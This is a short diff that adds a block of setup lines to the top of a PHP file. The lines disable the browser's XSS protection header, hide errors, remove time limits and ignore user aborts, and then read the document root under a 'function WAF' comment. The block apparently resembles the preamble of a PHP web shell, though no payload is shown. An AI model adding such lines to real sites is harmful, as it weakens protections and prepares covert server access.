@@ -1,7 +1,16 @@
 
 <?php
 
+header("X-XSS-Protection: 0");
+ob_start("ob_gzhandler");
+set_time_limit(0);
 
+ini_set('display_errors', FALSE);
+error_reporting(E_ERROR | E_PARSE);
+@ini_set("max_execution_time",0);
+@set_time_limit(0); #No Fx in SafeMode
+@ignore_user_abort(TRUE);
+@set_magic_quotes_runtime(0);
 
 # function WAF
 $dpath = isset($_SERVER["DOMAIN_PATH"]) ? $_SERVER["DOMAIN_PATH"] : $_SERVER["DOCUMENT_ROOT"];
